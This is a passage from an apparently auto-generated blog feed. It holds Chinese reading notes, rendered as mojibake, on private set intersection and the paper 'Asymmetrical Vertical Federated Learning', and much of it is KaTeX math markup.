id="éå¯¹ç§°PSI">éå¯¹ç§°PSI</h2><p>åŠ¨æœºï¼šä¸€æ–¹æ‹¥æœ‰å…ƒç´ çš„æ•°é‡æ¯”å¦ä¸€æ–¹å¤§å¾—å¤šï¼ˆå¼±æ–¹æ‹¥æœ‰çš„å¤§éƒ¨åˆ†å…ƒç´ å¯èƒ½éƒ½åœ¨äº¤é›†ä¸­å‡ºç°ï¼‰</p><p>æ–¹æ³•ï¼š1ã€ECC-OPRF-PSIï¼›2ã€FHE PSI</p><h2 id="å…¶ä»–ç‰¹æ®Šéœ€æ±‚">å…¶ä»–ç‰¹æ®Šéœ€æ±‚</h2><ul><li>Size-hiding</li><li>Business scenario with customized requirements</li></ul><h1 id="PSIæœ€æ–°è¿›å±•">PSIæœ€æ–°è¿›å±•</h1><ul><li>ä¼˜åŒ–ç¦»çº¿é˜¶æ®µ<ul><li>ä½¿ç”¨æœ€æ–°çš„<code>OT</code>æŠ€æœ¯</li><li>ä½¿ç”¨<code>VOLE</code>æ›¿æ¢OT</li></ul></li><li>ä½¿ç”¨æ–°çš„åŸè¯­ï¼ˆprimitivesï¼‰æ›¿æ¢Cuckoo Hashing<ul><li>å¼•å…¥<code>å­—ç¬¦ä¸²çš„æ¢æµ‹å’Œå¼‚æˆ–ï¼ˆProbe-and-Xor-of-Strings(PaXos)ï¼‰</code></li><li>å¼•å…¥<code>ä¸ç»æ„çš„é”®å€¼å¯¹å­˜å‚¨ï¼ˆOblivious Key-Value Store (OKVS)ï¼‰</code></li></ul></li><li>æ”¯æŒåœ¨äº¤é›†ä¸Šè¿›è¡Œåç»­çš„å®‰å…¨è®¡ç®—</li><li>äº¿çº§è®¡ç®—ï¼šé«˜å¸¦å®½ + é«˜ç®—åŠ›ï¼Œåˆ†é’Ÿçº§åˆ«å®Œæˆ</li></ul>]]></content>
      
      
      <categories>
          
          <category> è®ºæ–‡é˜…è¯» </category>
          
          <category> éšç§ä¿æŠ¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç§è®¡ç®— </tag>
            
            <tag> PSI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠAsymmetrical Vertical Federated Learningã€‹é˜…è¯»ç¬”è®°</title>
      <link href="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>è®ºæ–‡ï¼š<a href="https://arxiv.org/abs/2004.07427"> Y, Zhang X, Wang L. Asymmetrical vertical federated learning[J]. arXiv preprint arXiv:2004.07427, 2020.</a></p><p>åœ¨è”é‚¦å­¦ä¹ ä¸­ï¼Œé€šå¸¸ä¼šä½¿ç”¨åŸºäºIDçš„æ ·æœ¬å¯¹é½æ–¹æ³•ï¼Œä½†å´å¾ˆå°‘å…³æ³¨ä¿æŠ¤IDçš„éšç§ã€‚ä¸ºäº†ç¼“è§£å¯¹äºIDéšç§çš„æ‹…å¿§ï¼Œæœ¬æ–‡æ­£å¼æå‡º<strong>éå¯¹ç§°çºµå‘è”é‚¦å­¦ä¹ </strong>çš„æ¦‚å¿µï¼Œå¹¶ä¸”é˜è¿°äº†ä¿æŠ¤æ ·æœ¬IDçš„æ–¹æ³•ã€‚<br>æ ‡å‡†çš„éšç§æ±‚äº¤é€šå¸¸åœ¨éå¯¹ç§°çºµå‘è”é‚¦å­¦ä¹ çš„æ ·æœ¬å¯¹é½é˜¶æ®µè¢«é‡‡ç”¨ï¼Œæœ¬æ–‡ç›¸åº”çš„æå‡ºäº†ä¸€ç§ <strong>Pohlig-Hellman å®ç°æœºåˆ¶</strong>ã€‚æœ¬æ–‡è¿˜æå‡ºäº†ä¸€ç§ <strong>çœŸæ­£çš„è™šæ‹Ÿ(genuine with dummy)</strong> æ–¹æ³•æ¥å®ç°éå¯¹ç§°è”é‚¦å­¦ä¹ è®­ç»ƒã€‚</p><span id="more"></span><h1 id="Introduction">Introduction</h1><p>åœ¨è”é‚¦å­¦ä¹ ä¸­ï¼Œå°¤å…¶æ˜¯åœ¨çºµå‘åœºæ™¯ä¸­ï¼Œåœ¨åˆ©ç”¨IDå¯¹é½åˆ†å¸ƒæ•°æ®é›†åï¼Œå¿½ç•¥æ ·æœ¬çš„Dä¿¡æ¯æ³„éœ²æ˜¯å¸¸è§ä½†æ˜¯ä¸åˆç†çš„ã€‚å®é™…åº”ç”¨ä¸­ï¼Œå‚ä¸æ–¹é€šå¸¸æ˜¯å…·æœ‰&quot;é¡µé¢æ²¡æœ‰æ‰¾åˆ°&quot;å¸æˆ–è€…æœºæ„ï¼Œå› æ­¤ï¼Œä¸€æ–¹é¢ï¼Œå‚ä¸è€…ä¸å…è®¸æŠ«éœ²å®ƒä»¬çš„æ ·æœ¬IDï¼›å¦ä¸€æ–¹é¢ï¼Œç°å®ç”Ÿæ´»ä¸­å­˜åœ¨ç€<strong>ä¸å¯¹ç§°çš„è”é‚¦ï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†å‚ä¸è€…æ˜¯å¯¹IDéšç§è¦æ±‚å¾ˆé«˜çš„å°å…¬å¸ï¼Œè€Œå¦ä¸€éƒ¨åˆ†æ˜¯å¯¹IDéšç§ä¸å¤ªå…³å¿ƒçš„å¤§å…¬å¸</strong>(äº¤é›†ä¸€æ—¦å…¬å¸ƒï¼Œå°å…¬å¸çš„IDéšç§æ³„éœ²å¾ˆä¸¥é‡ï¼Œè€ƒè™‘æç«¯æƒ…å†µï¼Œç”šè‡³ä¼šå®Œå…¨æ³„éœ²)ã€‚è¿™ç§ä¸å¹³è¡¡çš„è®¾ç½®éœ€è¦ä¸€ä¸ªçºµå‘è”é‚¦å­¦ä¹ ç³»ç»Ÿæ¥åŒºåˆ†è”é‚¦çš„â€å¼ºâ€œå’Œâ€œå¼±â€ä¾§ï¼Œå¹¶ä¸”è€ƒè™‘åˆ°ä»–ä»¬ç‰¹å®šçš„éšç§ä¿æŠ¤éœ€æ±‚ã€‚</p><p>æœ¬æ–‡å°†çºµå‘è”é‚¦å­¦ä¹ åˆ†ä¸º<code>å¯¹ç§°å‹</code>å’Œ<code>éå¯¹ç§°å‹</code>ï¼Œä»¥ä¾¿è®¾è®¡ä¿æŠ¤IDçš„è”é‚¦å­¦ä¹ ç®—æ³•ã€‚æœ¬æ–‡çš„è´¡çŒ®åŒ…æ‹¬ï¼š</p><ol><li><p>æå‡ºéå¯¹ç§°çºµå‘è”é‚¦å­¦ä¹ çš„æ¦‚å¿µã€‚</p></li><li><p>å¸æ”¶æ ‡å‡†éšç§æ±‚äº¤åè®®ä»¥åœ¨éå¯¹ç§°è”é‚¦å­¦ä¹ ç³»ç»Ÿä¸­å®ç°éå¯¹ç§°IDå¯¹é½ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æä¾›ä¸€ç§Pohlig-Hellmançš„é€‚é…éšç§æ±‚äº¤çš„å®ç°ã€‚</p></li><li><p>æˆ‘ä»¬æå‡ºäº†ä¸€ç§çœŸæ­£çš„è™šæ‹Ÿæ–¹æ³•ä»¥å®ç°ä¸å¯¹ç§°çš„è”é‚¦æ¨¡å‹è®­ç»ƒã€‚ä¸ºäº†å±•ç¤ºå…¶åº”ç”¨ï¼Œæä¾›è”é‚¦é€»è¾‘å›å½’ç®—æ³•ä½œä¸ºä¾‹å­ã€‚</p></li></ol><h1 id="Problem-Definition">Problem Definition</h1><h2 id="Vertical-Federated-Learning">Vertical Federated Learning</h2><p>ä½¿ç”¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">D</mi><mo>=</mo><mo stretchy="false">(</mo><mrow><mi mathvariant="script">I</mi><mo separator="true">,</mo><mi mathvariant="script">X</mi><mo separator="true">,</mo><mi mathvariant="script">Y</mi></mrow><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{D}=(\mathcal{I,X,Y})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.08222em;">Y</span></span><span class="mclose">)</span></span></span></span> è¡¨ç¤º1ä¸ªå®Œæ•´çš„æ•°æ®é›†ï¼Œå…¶ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">D</mi><mo separator="true">,</mo><mi mathvariant="script">X</mi><mo separator="true">,</mo><mi mathvariant="script">Y</mi></mrow><annotation encoding="application/x-tex">\mathcal{D,X,Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathcal" style="margin-right:0.08222em;">Y</span></span></span></span></span> åˆ†åˆ«è¡¨ç¤ºæ ·æœ¬IDç©ºé—´ã€ç‰¹å¾ç©ºé—´å’Œæ ‡ç­¾ç©ºé—´ã€‚çºµå‘è”é‚¦å­¦ä¹ è¢«å®šä¹‰ä¸ºåœ¨2ä¸ªæ•°æ®é›† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">D</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{D}_1=(\mathcal{I}_1,\mathcal{X}_1,\mathcal{Y}_1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">D</mi><mn>2</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">X</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{D}_2=(\mathcal{I}_2,\mathcal{X}_2,\mathcal{Y}_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> ä¸Šï¼Œè¿™2ä¸ªæ•°æ®é›†æ»¡è¶³ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="script">X</mi><mn>1</mn></msub><mo mathvariant="normal">â‰ </mo><msub><mi mathvariant="script">X</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>1</mn></msub><mo mathvariant="normal">â‰ </mo><msub><mi mathvariant="script">Y</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{X}_{1} \neq \mathcal{X}_{2}, \mathcal{Y}_{1} \neq \mathcal{Y}_{2}, \mathcal{I}_{1}=\mathcal{I}_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel">î€ </span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel">î€ </span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p>ç„¶è€Œåœ¨ç°å®åº”ç”¨ä¸­ï¼Œå‡ ä¹æ— æ³•æ‰¾åˆ°2ä¸ªå…±äº«ç›¸åŒIDç©ºé—´çš„æ•°æ®é›†ã€‚å› æ­¤ï¼Œåœ¨çºµå‘è”é‚¦å­¦ä¹ çš„é¢„å¤„ç†é˜¶æ®µæœ‰å¿…è¦å¼•å…¥<code>IDå¯¹é½ï¼ˆID-alignmentï¼‰</code>åè®®ï¼Œä»¥å¸®åŠ©å„æ–¹å®‰å…¨è¯†åˆ«äº¤é›† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å¹¶å»ºç«‹ä¸¤ä¸ªæ•°æ®é›†çš„è¡Œæ˜ å°„ã€‚</p><p>æˆ‘ä»¬å®šä¹‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">D</mi><mn>1</mn><mi>o</mi></msubsup><mo>=</mo><mrow><mo fence="true">(</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msub><mi mathvariant="script">X</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>1</mn></msub><mo fence="true">)</mo></mrow><mtext>ï¼Œ</mtext><msubsup><mi mathvariant="script">D</mi><mn>2</mn><mi>o</mi></msubsup><mo>=</mo><mrow><mo fence="true">(</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo separator="true">,</mo><msub><mi mathvariant="script">X</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">Y</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathcal{D}_{1}^{o}=\left(\mathcal{I}_{1}^{o}, \mathcal{X}_{1}, \mathcal{Y}_{1}\right)ï¼Œ\mathcal{D}_{2}^{o}=\left(\mathcal{I}_{2}^{o}, \mathcal{X}_{2}, \mathcal{Y}_{2}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.14643em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1464em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord"><span class="mord mathcal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord 